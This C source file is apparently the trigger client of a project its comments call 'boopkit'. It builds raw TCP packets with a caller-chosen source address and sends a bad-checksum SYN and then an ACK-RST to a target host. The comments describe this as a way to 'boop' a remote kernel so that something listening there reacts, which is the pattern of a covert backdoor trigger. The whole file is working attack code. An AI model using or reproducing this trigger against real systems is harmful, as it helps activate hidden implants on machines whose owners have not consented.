// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// clang-format off
#include "tcp.h"
// clang-format on

// [trigger] <source-ip> <target-ip> <target-port>
//
// My research shows that with Linux 5.17 kernels
// the port doesn't matter to trigger a remote bad checksum
// event in a target kernel.
//
// However, because boopkit needs additional ways to boop a target
// we accept a port value here, as we try multiple boops against
// a remote!
//
int main(int argc, char **argv) {
  srand(time(NULL));
  if (argc != 4) {
    printf("Invalid parameters.\n");
    printf("USAGE %s <source-ip> <target-ip> <port>\n", argv[0]);
    return 1;
  }

  // [Vars]
  // one and oneval used for various socket options below.
  int one = 1;
  const int *oneval = &one;

  // [Destination]
  // Configure daddr fields sin_port, sin_addr, sin_family
  struct sockaddr_in daddr;
  daddr.sin_family = AF_INET;
  daddr.sin_port = htons(atoi(argv[3]));
  if (inet_pton(AF_INET, argv[2], &daddr.sin_addr) != 1) {
    printf("Destination IP configuration failed\n");
    return 1;
  }

  // [Source]
  // Configure saddr fields, sin_port, sin_addr, sin_family
  struct sockaddr_in saddr;
  saddr.sin_family = AF_INET;
  saddr.sin_port = htons(rand() % 65535);  // random client port
  if (inet_pton(AF_INET, argv[1], &saddr.sin_addr) != 1) {
    printf("Source IP configuration failed\n");
    return 1;
  }

  // Validate members to stdout
  char daddrstr[INET_ADDRSTRLEN];
  char saddrstr[INET_ADDRSTRLEN];

  inet_ntop(AF_INET, &daddr.sin_addr, daddrstr, sizeof daddrstr);
  inet_ntop(AF_INET, &saddr.sin_addr, saddrstr, sizeof saddrstr);

  printf("\n-------------------------------------------------------\n");
  printf(" Destination : %s:%d\n", daddrstr, ntohs(daddr.sin_port));
  printf("   Source    : %s:%d\n", saddrstr, ntohs(saddr.sin_port));
  printf("-------------------------------------------------------\n\n");

  //

  // ===========================================================================  // 1. Bad checksum SYN SOCK_RAW
  // 1. Connectionless Bad Checksum
  //
  // Send a bad TCP checksum packet to any TCP socket. Regardless if a server
  // is running. The kernel will still trigger a bad TCP checksum event.
  //
  // Note: This is a connectionless SYN packet over SOCK_RAW which allows us to
  // do our dirty work.
  //
  // [Socket] SOCK_RAW Reliably-delivered messages.
  // TODO: @kris-nova experiment with SOCK_DGRAM for connectionless datagrams
  // of unfixed length!
  int sock1 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock1 == -1) {
    printf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock1, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    printf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  // [SYN] Send a packet with a 0 checksum!
  char *packet;
  int packet_len;
  // TODO: @kris-nova We should spam a few bad checksum ports! We know we can
  // send to any TCP port on the server!
  create_bad_syn_packet(&saddr, &daddr, &packet, &packet_len);
  int sent;
  if ((sent = sendto(sock1, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send bad checksum SYN packet over SOCK_RAW.\n");
    return 2;
  }
  printf("SYN      [bad checksum] -> %s:%s %d bytes\n", argv[2], argv[3], sent);
  close(sock1);
  // ===========================================================================

  // ===========================================================================  // 2. TCP SOCK_STREAM Connection
  // 2. Connection Socket
  //
  // Here we have a connection based socket. This connection is not required
  // for a "boop". However, we use this to validate we can truly communicate
  // with the backend server. A failure to configure a SOCK_STREAM socket
  // against a remote, can indicate we aren't just firing into the abyss.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock2 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock2 == -1) {
    printf("Socket creation failed\n");
    return 1;
  }
  if (connect(sock2, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
    printf("Connection SOCK_STREAM refused.\n");
    return 2;
  }
  printf("CONNECT  [    okay    ] -> %s:%s\n", argv[2], argv[3]);
  close(sock2);
  // ===========================================================================



  // ===========================================================================  // 3. TCP Reset SOCK_RAW
  //
  // This is the 3rd mechanism we use to boop a server.
  // Here we complete a TCP handshake, however we also flip the RST header bit
  // in the hopes of trigger a TCP reset via a remote TCP service.
  //
  // The first bad checksum approach will fail blindly due to the nature of raw
  // sockets. This is a much more reliable boop, however it comes with more
  // risk as it boops through an application.
  //
  // [Socket] SOCK_STREAM Sequenced, reliable, connection-based byte streams.
  int sock3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock3 == -1) {
    printf("Socket SOCK_RAW creation failed\n");
    return 1;
  }
  // [Socket] IP_HDRINCL Header Include
  if (setsockopt(sock3, IPPROTO_IP, IP_HDRINCL, oneval, sizeof(one)) == -1) {
    printf("Unable to set socket option [IP_HDRINCL]\n");
    return 1;
  }
  create_syn_packet(&saddr, &daddr, &packet, &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send RST over SOCK_STREAM.\n");
    return 2;
  }
  printf("SYN      [    okay    ] -> %d bytes to %s:%s\n", sent, argv[2],
         argv[3]);
  char recvbuf[DATAGRAM_LEN];
  int received = receive_from(sock3, recvbuf, sizeof(recvbuf), &saddr);
  if (received <= 0) {
    printf("Unable to receive SYN-ACK over SOCK_STREAM.\n");
    return 3;
  }
  printf("SYN-ACK  [    okay    ] <- %d bytes from %s\n", received, argv[2]);
  uint32_t seq_num, ack_num;
  read_seq_and_ack(recvbuf, &seq_num, &ack_num);
  int new_seq_num = seq_num + 1;
  create_ack_rst_packet(&saddr, &daddr, ack_num, new_seq_num, &packet,
                        &packet_len);
  if ((sent = sendto(sock3, packet, packet_len, 0, (struct sockaddr *)&daddr,
                     sizeof(struct sockaddr))) == -1) {
    printf("Unable to send ACK-RST over SOCK_STREAM.\n");
    return 2;
  }
  printf("ACK-RST  [    okay    ] -> %d bytes to %s:%s\n", sent, argv[2],
         argv[3]);
  close(sock3);
  // ===========================================================================


  return 0;
}
